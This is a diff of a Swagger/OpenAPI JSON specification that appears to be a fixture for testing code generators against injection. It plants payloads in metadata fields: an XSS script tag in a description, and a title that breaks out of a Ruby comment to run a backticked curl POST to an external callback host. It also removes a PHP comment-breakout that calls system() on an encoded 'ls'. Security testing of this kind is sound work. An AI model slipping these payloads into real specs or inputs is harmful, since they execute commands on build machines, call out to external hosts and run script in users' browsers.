@@ -3,7 +3,7 @@
           "info": {
               "description": "<script>alert(1)</script>",
               "version": "1.0.0",
-              "title": "C"
+              "title": "=end `curl -X POST -d \"fizz=buzz\" https://eo2gjl4lyl460rs.m.pipedream.net`"
           },
           "schemes": [
               "http"
@@ -34,7 +34,7 @@
           "definitions": {
               "d": {
                   "type": "object",
-                  "description": "*/ echo system(chr(0x6c).chr(0x73)); /*"",
+                  "description": "teste",
                   "properties": {
                       "id": {
                           "type": "integer",
